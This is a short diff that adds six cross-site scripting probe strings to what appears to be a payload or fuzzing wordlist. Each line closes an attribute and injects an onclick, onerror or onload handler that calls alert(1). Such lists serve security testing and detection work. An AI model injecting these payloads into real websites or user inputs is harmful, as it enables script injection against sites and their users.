@@ -1,0 +1,6 @@
+><tag onclick=a;alert(1)>
+><tag onclick=a;alert(1)>
+><tag onerror=a;alert(1)>
+><tag onerror=a;alert(1)>
+><tag onload=a;alert(1)>
+><tag onload=a;alert(1)>
